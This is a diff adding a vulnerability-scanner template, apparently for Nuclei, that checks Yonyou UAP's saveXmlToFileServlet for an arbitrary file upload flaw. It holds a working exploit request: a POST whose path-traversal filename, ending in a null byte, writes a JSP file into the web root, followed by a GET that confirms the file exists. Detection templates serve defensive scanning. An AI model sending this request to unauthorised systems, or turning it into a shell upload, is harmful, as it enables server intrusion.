@@ -1,0 +1,28 @@
+id: yonyou-uap-saveXmlToFileServlet-upload-file
+info:
+  name: yonyou-uap-saveXmlToFileServlet-upload-file
+  author: qianbenhyu
+  severity: high
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{randstr_1}}.jsp%00"
+    headers:
+      Cookie: LA_K1=langid
+      serverEnable: localserver
+      Accept-Encoding: gzip, x-gzip, deflate
+      Content-Length: 27
+      Content-Type: application/octet-stream
+      Content-Encoding: UTF_8
+      Connection: keep-alive
+      User-Agent: Apache-HttpClient/5.2.1 (Java/1.8.0_202)
+    body: "{{randstr_2}}"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{randstr_1}}.jsp"
+    matchers:
+      - type: word
+        words:
+          - "{{randstr_2}}"
